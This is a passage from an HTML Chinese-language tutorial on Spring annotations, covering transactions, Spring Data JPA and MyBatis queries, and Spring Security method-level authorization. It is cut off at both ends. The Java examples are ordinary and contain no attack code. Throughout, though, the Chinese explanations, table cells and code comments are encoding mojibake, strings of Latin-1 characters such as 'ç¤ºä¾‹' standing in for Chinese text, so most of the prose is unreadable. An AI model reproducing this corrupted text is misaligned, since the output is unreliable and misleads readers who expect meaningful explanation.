IllegalArgumentException.class</code></td></tr><tr><td>noRollbackForClassName</td><td>ä¸è§¦å‘å›æ»šçš„å¼‚å¸¸ç±»å</td><td>å­—ç¬¦ä¸²æ•°ç»„ï¼Œå¦‚<code>noRollbackForClassName = "java.lang.IllegalArgumentException"</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Transactional(readOnly = true)</span> <span class="hljs-comment">// ç±»çº§ï¼šæ‰€æœ‰publicæ–¹æ³•é»˜è®¤åªè¯»äº‹åŠ¡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
 Â  <span class="hljs-comment">// æ–¹æ³•çº§ï¼šè¦†ç›–ç±»çº§é…ç½®ï¼Œè¯»å†™äº‹åŠ¡ï¼Œè¶…æ—¶30ç§’ï¼ŒæŒ‡å®šå¼‚å¸¸å›æ»š</span>
 Â  <span class="hljs-meta">@Transactional(
 Â  Â  Â  propagation = Propagation.REQUIRED,
 Â  Â  Â  isolation = Isolation.READ_COMMITTED,
 Â  Â  Â  timeout = 30,
 Â  Â  Â  readOnly = false,
 Â  Â  Â  rollbackFor = {OrderException.class, SQLException.class}
 Â  )</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderDTO orderDTO)</span> {
 Â  Â  Â  <span class="hljs-comment">// è®¢å•åˆ›å»ºé€»è¾‘ï¼ˆå¢åˆ æ”¹æ“ä½œï¼‰</span>
 Â  Â  Â  orderMapper.insert(orderDTO);
 Â  Â  Â  inventoryMapper.deduct(orderDTO.getProductId(), orderDTO.getQuantity());
 Â  }
 Â  <span class="hljs-comment">// ç»§æ‰¿ç±»çº§åªè¯»äº‹åŠ¡</span>
 Â  <span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long orderId)</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> orderMapper.selectById(orderId);
 Â  }
}
</code></pre>
<h3 data-id="heading-35">2. @EnableTransactionManagement</h3>
<p><code>@EnableTransactionManagement</code> ç”¨äºå¯ç”¨ Spring å£°æ˜å¼äº‹åŠ¡ç®¡ç†ï¼Œæ ‡æ³¨åœ¨é…ç½®ç±»ä¸Šã€‚</p>
<ul>
<li>æ ¸å¿ƒä½œç”¨ï¼šæ¿€æ´» Spring çš„äº‹åŠ¡æ³¨è§£é©±åŠ¨ï¼Œè‡ªåŠ¨æ‰«æ<code>@Transactional</code>æ ‡æ³¨çš„ Bean å¹¶ç”Ÿæˆä»£ç†ï¼›</li>
<li>å…¼å®¹æ¨¡å¼ï¼šæ”¯æŒ Spring AOP å’Œ AspectJ ä¸¤ç§ä»£ç†æ–¹å¼ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>proxyTargetClass</td><td>æ˜¯å¦ä½¿ç”¨ CGLIB ä»£ç†</td><td>â‘  <code>true</code>ï¼šå¼ºåˆ¶ CGLIB ä»£ç†ï¼ˆç±»ä»£ç†ï¼‰ï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šä¼˜å…ˆ JDK åŠ¨æ€ä»£ç†ï¼ˆæ¥å£ä»£ç†ï¼‰</td></tr><tr><td>mode</td><td>äº‹åŠ¡ä»£ç†æ¨¡å¼</td><td>æšä¸¾å€¼ï¼š<code>PROXY</code>ï¼ˆé»˜è®¤ï¼ŒSpring AOP ä»£ç†ï¼‰ã€<code>ASPECTJ</code>ï¼ˆAspectJ ä»£ç†ï¼Œéœ€é¢å¤–ä¾èµ–ï¼‰</td></tr><tr><td>order</td><td>äº‹åŠ¡åˆ‡é¢ä¼˜å…ˆçº§</td><td>æ•°å€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼Œé»˜è®¤<code>Ordered.LOWEST_PRECEDENCE</code>ï¼ˆæœ€ä½ï¼‰</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableTransactionManagement(proxyTargetClass = true)</span> <span class="hljs-comment">// å¯ç”¨äº‹åŠ¡ç®¡ç†ï¼Œä½¿ç”¨CGLIBä»£ç†</span>
<span class="hljs-meta">@MapperScan("com.example.mapper")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionConfig</span> {
 Â  <span class="hljs-comment">// é…ç½®äº‹åŠ¡ç®¡ç†å™¨ï¼ˆåŸºäºæ•°æ®æºï¼‰</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> PlatformTransactionManager <span class="hljs-title function_">transactionManager</span><span class="hljs-params">(DataSource dataSource)</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>(dataSource);
 Â  }
}
</code></pre>
<h2 data-id="heading-36">å››ã€æ•°æ®è®¿é—®ç›¸å…³æ³¨è§£</h2>
<p>æ•°æ®è®¿é—®æ³¨è§£æ¶µç›– Spring Data JPAã€MyBatis ç­‰æŒä¹…å±‚æ¡†æ¶çš„æ ¸å¿ƒæ³¨è§£ï¼Œç®€åŒ–æ•°æ®æ“ä½œé€»è¾‘ã€‚</p>
<h3 data-id="heading-37">1. Spring Data JPA æ ¸å¿ƒæ³¨è§£</h3>
<h4 data-id="heading-38">ï¼ˆ1ï¼‰@RepositoryRestResource</h4>
<p><code>@RepositoryRestResource</code> ç”¨äº Spring Data RESTï¼Œå°† Repository è‡ªåŠ¨æš´éœ²ä¸º RESTful APIï¼Œæ— éœ€æ‰‹åŠ¨ç¼–å†™ Controllerã€‚</p>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



































<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>path</td><td>API è·¯å¾„</td><td>å¦‚<code>path = "users"</code>ï¼Œè®¿é—®è·¯å¾„<code>/users</code></td></tr><tr><td>collectionResourceRel</td><td>é›†åˆèµ„æºå…³ç³»å</td><td>ç”¨äº HATEOAS é“¾æ¥ï¼Œå¦‚<code>collectionResourceRel = "userList"</code></td></tr><tr><td>itemResourceRel</td><td>å•ä¸ªèµ„æºå…³ç³»å</td><td>å¦‚<code>itemResourceRel = "user"</code></td></tr><tr><td>exported</td><td>æ˜¯å¦æš´éœ² API</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šæš´éœ²ï¼›â‘¡ <code>false</code>ï¼šä¸æš´éœ²</td></tr><tr><td>excerptProjection</td><td>é»˜è®¤æŠ•å½±</td><td>æŒ‡å®šé»˜è®¤è¿”å›çš„å­—æ®µæŠ•å½±ç±»</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªåŠ¨æš´éœ²REST APIï¼š/usersï¼ˆGET/POST/PUT/DELETEï¼‰</span>
<span class="hljs-meta">@RepositoryRestResource(path = "users", collectionResourceRel = "userList")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;User, Long&gt; {
 Â  <span class="hljs-comment">// è‡ªåŠ¨ç”ŸæˆAPIï¼š/users/search/byName?name=xxx</span>
 Â  <span class="hljs-meta">@RestResource(path = "byName", rel = "findByName")</span>
 Â  List&lt;User&gt; <span class="hljs-title function_">findByNameContaining</span><span class="hljs-params">(<span class="hljs-meta">@Param("name")</span> String name)</span>;
}
</code></pre>
<h4 data-id="heading-39">ï¼ˆ2ï¼‰@Query</h4>
<p><code>@Query</code> ç”¨äºè‡ªå®šä¹‰ JPQL/SQL æŸ¥è¯¢ï¼Œæ ‡æ³¨åœ¨ Repository æ–¹æ³•ä¸Šã€‚</p>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



































<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>æŸ¥è¯¢è¯­å¥</td><td>JPQLï¼ˆé»˜è®¤ï¼‰æˆ– SQLï¼ˆéœ€é…åˆ<code>nativeQuery = true</code>ï¼‰</td></tr><tr><td>nativeQuery</td><td>æ˜¯å¦åŸç”Ÿ SQL</td><td>â‘  <code>true</code>ï¼šåŸç”Ÿ SQLï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šJPQL</td></tr><tr><td>countQuery</td><td>è®¡æ•°æŸ¥è¯¢è¯­å¥</td><td>é…åˆåˆ†é¡µæŸ¥è¯¢ï¼Œè¿”å›æ€»æ¡æ•°</td></tr><tr><td>countProjection</td><td>è®¡æ•°æŠ•å½±</td><td>ç®€åŒ–è®¡æ•°æŸ¥è¯¢ï¼Œå¦‚<code>countProjection = "id"</code></td></tr><tr><td>namedParameters</td><td>æ˜¯å¦æ”¯æŒå‘½åå‚æ•°</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šæ”¯æŒ<code>@Param</code>å‘½åå‚æ•°ï¼›â‘¡ <code>false</code>ï¼šä»…æ”¯æŒä½ç½®å‚æ•°</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Product, Long&gt; {
 Â  <span class="hljs-comment">// JPQLæŸ¥è¯¢ï¼ˆå‚æ•°ä½¿ç”¨:nameï¼‰</span>
 Â  <span class="hljs-meta">@Query("SELECT p FROM Product p WHERE p.name LIKE %:name% AND p.price &lt;= :maxPrice")</span>
 Â  List&lt;Product&gt; <span class="hljs-title function_">findByCondition</span><span class="hljs-params">(<span class="hljs-meta">@Param("name")</span> String name, <span class="hljs-meta">@Param("maxPrice")</span> BigDecimal maxPrice)</span>;
 Â  <span class="hljs-comment">// åŸç”ŸSQLæŸ¥è¯¢</span>
 Â  <span class="hljs-meta">@Query(
 Â  Â  Â  value = "SELECT * FROM product WHERE category_id = ?1 AND stock &gt; 0",
 Â  Â  Â  nativeQuery = true
 Â  )</span>
 Â  List&lt;Product&gt; <span class="hljs-title function_">findAvailableByCategoryId</span><span class="hljs-params">(Long categoryId)</span>;
 Â  <span class="hljs-comment">// åˆ†é¡µ+è®¡æ•°æŸ¥è¯¢</span>
 Â  <span class="hljs-meta">@Query(value = "SELECT p FROM Product p WHERE p.createTime &gt;= :startTime",
 Â  Â  Â  Â  Â countQuery = "SELECT COUNT(p.id) FROM Product p WHERE p.createTime &gt;= :startTime")</span>
 Â  Page&lt;Product&gt; <span class="hljs-title function_">findByCreateTimeAfter</span><span class="hljs-params">(<span class="hljs-meta">@Param("startTime")</span> LocalDateTime startTime, Pageable pageable)</span>;
}
</code></pre>
<h4 data-id="heading-40">ï¼ˆ3ï¼‰@Modifying</h4>
<p><code>@Modifying</code> é…åˆ<code>@Query</code>ä½¿ç”¨ï¼Œæ ‡è¯†è¯¥æŸ¥è¯¢ä¸ºä¿®æ”¹æ“ä½œï¼ˆINSERT/UPDATE/DELETEï¼‰ï¼Œéœ€åœ¨äº‹åŠ¡ä¸­æ‰§è¡Œã€‚</p>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;User, Long&gt; {
 Â  <span class="hljs-meta">@Modifying</span>
 Â  <span class="hljs-meta">@Query("UPDATE User u SET u.status = :status WHERE u.id IN :ids")</span>
 Â  <span class="hljs-meta">@Transactional</span> <span class="hljs-comment">// ä¿®æ”¹æ“ä½œéœ€äº‹åŠ¡æ”¯æŒ</span>
 Â  <span class="hljs-type">int</span> <span class="hljs-title function_">batchUpdateStatus</span><span class="hljs-params">(<span class="hljs-meta">@Param("status")</span> Integer status, <span class="hljs-meta">@Param("ids")</span> List&lt;Long&gt; ids)</span>;
}
</code></pre>
<h3 data-id="heading-41">2. MyBatis æ ¸å¿ƒæ³¨è§£</h3>
<h4 data-id="heading-42">ï¼ˆ1ï¼‰@Mapper</h4>
<p><code>@Mapper</code> æ ‡è¯†æ¥å£ä¸º MyBatis æ˜ å°„å™¨æ¥å£ï¼ŒMyBatis ä¼šè‡ªåŠ¨æ‰«æå¹¶ç”Ÿæˆä»£ç†å®ç°ç±»ã€‚</p>
<ul>
<li>æ›¿ä»£æ–¹æ¡ˆï¼šå¯é€šè¿‡<code>@MapperScan</code>ï¼ˆé…ç½®ç±»æ³¨è§£ï¼‰æ‰¹é‡æ‰«æåŒ…ä¸‹çš„ Mapper æ¥å£ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å•ä¸ªMapperæ¥å£æ ‡æ³¨</span>
<span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> {
 Â  <span class="hljs-meta">@Select("SELECT * FROM user WHERE id = #{id}")</span>
 Â  User <span class="hljs-title function_">selectById</span><span class="hljs-params">(Long id)</span>;
 Â  <span class="hljs-meta">@Insert("INSERT INTO user(name, age) VALUES(#{name}, #{age})")</span>
 Â  <span class="hljs-meta">@Options(useGeneratedKeys = true, keyProperty = "id")</span> <span class="hljs-comment">// è‡ªåŠ¨ç”Ÿæˆä¸»é”®å¹¶å›å†™</span>
 Â  <span class="hljs-type">int</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(User user)</span>;
}
<span class="hljs-comment">// é…ç½®ç±»æ‰¹é‡æ‰«æï¼ˆæ¨èï¼‰</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@MapperScan("com.example.mapper")</span> <span class="hljs-comment">// æ‰«æè¯¥åŒ…ä¸‹æ‰€æœ‰Mapperæ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisConfig</span> {
}
</code></pre>
<h4 data-id="heading-43">ï¼ˆ2ï¼‰MyBatis æŸ¥è¯¢ / æ“ä½œæ³¨è§£</h4>
<p>MyBatis æä¾›ä¸€ç³»åˆ—æ³¨è§£æ›¿ä»£ XML æ˜ å°„æ–‡ä»¶ï¼Œæ ¸å¿ƒåŒ…æ‹¬ï¼š</p>
<ul>
<li><code>@Select</code>ï¼šæŸ¥è¯¢æ“ä½œ</li>
<li><code>@Insert</code>ï¼šæ’å…¥æ“ä½œ</li>
<li><code>@Update</code>ï¼šæ›´æ–°æ“ä½œ</li>
<li><code>@Delete</code>ï¼šåˆ é™¤æ“ä½œ</li>
<li><code>@ResultMap</code>ï¼šå¼•ç”¨ XML ä¸­çš„ç»“æœæ˜ å°„</li>
<li><code>@Param</code>ï¼šæŒ‡å®šæ–¹æ³•å‚æ•°åï¼ˆç”¨äº SQL ä¸­ #{name} å¼•ç”¨ï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderMapper</span> {
 Â  <span class="hljs-comment">// æŸ¥è¯¢ï¼ˆå…³è”æŸ¥è¯¢ï¼Œä½¿ç”¨@Resultsæ˜ å°„ï¼‰</span>
 Â  <span class="hljs-meta">@Select("SELECT o.id, o.order_no, o.user_id, u.name user_name " +
 Â  Â  Â  Â  Â  "FROM order o LEFT JOIN user u ON o.user_id = u.id " +
 Â  Â  Â  Â  Â  "WHERE o.id = #{id}")</span>
 Â  <span class="hljs-meta">@Results({
 Â  Â  Â  @Result(column = "id", property = "id", id = true),
 Â  Â  Â  @Result(column = "order_no", property = "orderNo"),
 Â  Â  Â  @Result(column = "user_id", property = "userId"),
 Â  Â  Â  @Result(column = "user_name", property = "userName")
 Â  })</span>
 Â  OrderVO <span class="hljs-title function_">selectOrderVOById</span><span class="hljs-params">(Long id)</span>;
 Â  <span class="hljs-comment">// æ‰¹é‡æ’å…¥</span>
 Â  <span class="hljs-meta">@Insert("&lt;script&gt;" +
 Â  Â  Â  Â  Â  "INSERT INTO order(user_id, order_no, amount) " +
 Â  Â  Â  Â  Â  "VALUES" +
 Â  Â  Â  Â  Â  "&lt;foreach collection='list' item='item' separator=','&gt;" +
 Â  Â  Â  Â  Â  "(#{item.userId}, #{item.orderNo}, #{item.amount})" +
 Â  Â  Â  Â  Â  "&lt;/foreach&gt;" +
 Â  Â  Â  Â  Â  "&lt;/script&gt;")</span>
 Â  <span class="hljs-type">int</span> <span class="hljs-title function_">batchInsert</span><span class="hljs-params">(<span class="hljs-meta">@Param("list")</span> List&lt;Order&gt; orderList)</span>;
 Â  <span class="hljs-comment">// æ›´æ–°</span>
 Â  <span class="hljs-meta">@Update("UPDATE order SET status = #{status} WHERE id = #{id}")</span>
 Â  <span class="hljs-type">int</span> <span class="hljs-title function_">updateStatus</span><span class="hljs-params">(<span class="hljs-meta">@Param("id")</span> Long id, <span class="hljs-meta">@Param("status")</span> Integer status)</span>;
}
</code></pre>
<h2 data-id="heading-44">äº”ã€Spring Security å®‰å…¨ç›¸å…³æ³¨è§£</h2>
<p>Spring Security æ³¨è§£ç”¨äºå®ç°æƒé™æ§åˆ¶ã€èº«ä»½è®¤è¯ç›¸å…³åŠŸèƒ½ï¼Œç®€åŒ–å®‰å…¨é…ç½®ã€‚</p>
<h3 data-id="heading-45">1. @EnableWebSecurity</h3>
<p><code>@EnableWebSecurity</code> ç”¨äºå¯ç”¨ Spring Security çš„ Web å®‰å…¨æ”¯æŒï¼Œæ ‡æ³¨åœ¨å®‰å…¨é…ç½®ç±»ä¸Šã€‚</p>
<ul>
<li>æ ¸å¿ƒä½œç”¨ï¼šæ¿€æ´» Spring Security çš„è‡ªåŠ¨é…ç½®ï¼ŒåŠ è½½é»˜è®¤å®‰å…¨è§„åˆ™ï¼ˆå¦‚ç™»å½•é¡µé¢ã€CSRF é˜²æŠ¤ç­‰ï¼‰ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSecurity</span> <span class="hljs-comment">// å¯ç”¨Webå®‰å…¨</span>
<span class="hljs-meta">@EnableMethodSecurity</span> <span class="hljs-comment">// å¯ç”¨æ–¹æ³•çº§æƒé™æ§åˆ¶ï¼ˆSpring Security 6+ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> {
 Â  <span class="hljs-comment">// é…ç½®ç”¨æˆ·è®¤è¯ï¼ˆå†…å­˜ç”¨æˆ·ç¤ºä¾‹ï¼‰</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> UserDetailsService <span class="hljs-title function_">userDetailsService</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-type">UserDetails</span> <span class="hljs-variable">admin</span> <span class="hljs-operator">=</span> User.withUsername(<span class="hljs-string">"admin"</span>)
 Â  Â  Â  Â  Â  Â  Â  .password(passwordEncoder().encode(<span class="hljs-string">"123456"</span>))
 Â  Â  Â  Â  Â  Â  Â  .roles(<span class="hljs-string">"ADMIN"</span>)
 Â  Â  Â  Â  Â  Â  Â  .build();
 Â  Â  Â  <span class="hljs-type">UserDetails</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> User.withUsername(<span class="hljs-string">"user"</span>)
 Â  Â  Â  Â  Â  Â  Â  .password(passwordEncoder().encode(<span class="hljs-string">"123456"</span>))
 Â  Â  Â  Â  Â  Â  Â  .roles(<span class="hljs-string">"USER"</span>)
 Â  Â  Â  Â  Â  Â  Â  .build();
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryUserDetailsManager</span>(admin, user);
 Â  }
 Â  <span class="hljs-comment">// å¯†ç åŠ å¯†å™¨</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();
 Â  }
 Â  <span class="hljs-comment">// é…ç½®å®‰å…¨è§„åˆ™</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> SecurityFilterChain <span class="hljs-title function_">securityFilterChain</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception {
 Â  Â  Â  http
 Â  Â  Â  Â  Â  .authorizeHttpRequests(auth -&gt; auth
 Â  Â  Â  Â  Â  Â  Â  .requestMatchers(<span class="hljs-string">"/public/**"</span>).permitAll() <span class="hljs-comment">// å…¬å¼€è·¯å¾„</span>
 Â  Â  Â  Â  Â  Â  Â  .requestMatchers(<span class="hljs-string">"/admin/**"</span>).hasRole(<span class="hljs-string">"ADMIN"</span>) <span class="hljs-comment">// ä»…ADMINè§’è‰²å¯è®¿é—®</span>
 Â  Â  Â  Â  Â  Â  Â  .anyRequest().authenticated() <span class="hljs-comment">// å…¶ä»–è·¯å¾„éœ€è®¤è¯</span>
 Â  Â  Â  Â  Â  )
 Â  Â  Â  Â  Â  .formLogin(form -&gt; form.permitAll()) <span class="hljs-comment">// å¯ç”¨é»˜è®¤ç™»å½•é¡µé¢</span>
 Â  Â  Â  Â  Â  .logout(logout -&gt; logout.permitAll()); <span class="hljs-comment">// å¯ç”¨æ³¨é”€åŠŸèƒ½</span>
 Â  Â  Â  <span class="hljs-keyword">return</span> http.build();
 Â  }
}
</code></pre>
<h3 data-id="heading-46">2. @EnableMethodSecurity</h3>
<p><code>@EnableMethodSecurity</code>ï¼ˆSpring Security 6+ï¼Œæ›¿ä»£æ—§ç‰ˆ<code>@EnableGlobalMethodSecurity</code>ï¼‰ç”¨äºå¯ç”¨æ–¹æ³•çº§æƒé™æ§åˆ¶ï¼Œæ”¯æŒ<code>@PreAuthorize</code>ã€<code>@PostAuthorize</code>ç­‰æ³¨è§£ã€‚</p>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>prePostEnabled</td><td>æ˜¯å¦å¯ç”¨ @PreAuthorize/@PostAuthorize</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šå¯ç”¨ï¼›â‘¡ <code>false</code>ï¼šç¦ç”¨</td></tr><tr><td>securedEnabled</td><td>æ˜¯å¦å¯ç”¨ @Secured</td><td>â‘  <code>true</code>ï¼šå¯ç”¨ï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šç¦ç”¨</td></tr><tr><td>jsr250Enabled</td><td>æ˜¯å¦å¯ç”¨ JSR-250 æ³¨è§£ï¼ˆå¦‚ @RolesAllowedï¼‰</td><td>â‘  <code>true</code>ï¼šå¯ç”¨ï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šç¦ç”¨</td></tr></tbody></table>
<h3 data-id="heading-47">3. æ–¹æ³•çº§æƒé™æ³¨è§£</h3>
<h4 data-id="heading-48">ï¼ˆ1ï¼‰@PreAuthorize</h4>
<p><code>@PreAuthorize</code> æ–¹æ³•æ‰§è¡Œå‰è¿›è¡Œæƒé™æ ¡éªŒï¼Œæ”¯æŒ SpEL è¡¨è¾¾å¼ï¼Œçµæ´»æ§åˆ¶è®¿é—®æƒé™ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceService</span> {
 Â  <span class="hljs-comment">// ä»…ADMINè§’è‰²å¯è®¿é—®</span>
 Â  <span class="hljs-meta">@PreAuthorize("hasRole('ADMIN')")</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteResource</span><span class="hljs-params">(Long id)</span> {
 Â  Â  Â  <span class="hljs-comment">// åˆ é™¤èµ„æºé€»è¾‘</span>
 Â  }
 Â  <span class="hljs-comment">// ä»…æœ¬äººæˆ–ADMINå¯è®¿é—®ï¼ˆSpELè¡¨è¾¾å¼ï¼Œ#userIdä¸ºæ–¹æ³•å‚æ•°ï¼‰</span>
 Â  <span class="hljs-meta">@PreAuthorize("authentication.principal.username == #username or hasRole('ADMIN')")</span>
 Â  <span class="hljs-keyword">public</span> UserDTO <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">(String username)</span> {
 Â  Â  Â  <span class="hljs-comment">// æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯</span>
 Â  }
 Â  <span class="hljs-comment">// æƒé™è¡¨è¾¾å¼ç»“åˆè‡ªå®šä¹‰æ–¹æ³•ï¼ˆéœ€æ³¨å†ŒBeanï¼šcustomPermissionEvaluatorï¼‰</span>
 Â  <span class="hljs-meta">@PreAuthorize("@customPermissionEvaluator.hasPermission(#orderId, authentication)")</span>
 Â  <span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long orderId)</span> {
 Â  Â  Â  <span class="hljs-comment">// æŸ¥è¯¢è®¢å•</span>
 Â  }
}
</code></pre>
<h4 data-id="heading-49">ï¼ˆ2ï¼‰@PostAuthorize</h4>
<p><code>@PostAuthorize</code> æ–¹æ³•æ‰§è¡Œåè¿›è¡Œæƒé™æ ¡éªŒï¼Œé€‚ç”¨äºéœ€è¦æ ¹æ®è¿”å›ç»“æœåˆ¤æ–­æƒé™çš„åœºæ™¯ï¼ˆå¦‚æ•°æ®æƒé™ï¼‰ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
 Â  <span class="hljs-comment">// æ–¹æ³•æ‰§è¡Œåæ ¡éªŒï¼šè¿”å›çš„è®¢å•æ‰€å±ç”¨æˆ·ä¸å½“å‰ç™»å½•ç”¨æˆ·ä¸€è‡´</span>
 Â  <span class="hljs-meta">@PostAuthorize("returnObject.userId == authentication.principal.id")</span>
 Â  <span class="hljs-keyword">public</span> OrderDTO <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(Long orderId)</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> orderMapper.selectById(orderId);
 Â  }
}
</code></pre>
<h4 data-id="heading-50">ï¼ˆ3ï¼‰@Secured</h4>
<p><code>@Secured</code> ç”¨äºåŸºäºè§’è‰²çš„æƒé™æ§åˆ¶ï¼Œä»…æ”¯æŒè§’è‰²åç§°ï¼ˆéœ€ä»¥<code>ROLE_</code>å‰ç¼€å¼€å¤´ï¼Œæˆ–é…ç½®<code>rolePrefix</code>ï¼‰ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
 Â  <span class="hljs-comment">// ä»…ROLE_ADMINè§’è‰²å¯è®¿é—®ï¼ˆæ³¨æ„å‰ç¼€ROLE_ï¼‰</span>
 Â  <span class="hljs-meta">@Secured("ROLE_ADMIN")</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchDelete</span><span class="hljs-params">(List&lt;Long&gt; ids)</span> {
 Â  Â  Â  userMapper.batchDelete(ids);
 Â  }
 Â  <span class="hljs-comment">// å¤šè§’è‰²æ”¯æŒï¼ˆORå…³ç³»ï¼‰</span>
 Â  <span class="hljs-meta">@Secured({"ROLE_ADMIN", "ROLE_OPERATOR"})</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUserStatus</span><span class="hljs-params">(Long id, Integer status)</span> {
 Â  Â  Â  userMapper.updateStatus(id, status);
 Â  }
}
</code></pre>
<h4 data-id="heading-51">ï¼ˆ4ï¼‰@RolesAllowedï¼ˆJSR-250ï¼‰</h4>
<p><code>@RolesAllowed</code> æ˜¯ JSR-250 æ ‡å‡†æ³¨è§£ï¼ŒåŠŸèƒ½ä¸<code>@Secured</code>ç±»ä¼¼ï¼Œæ”¯æŒè§’è‰²æƒé™æ§åˆ¶ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
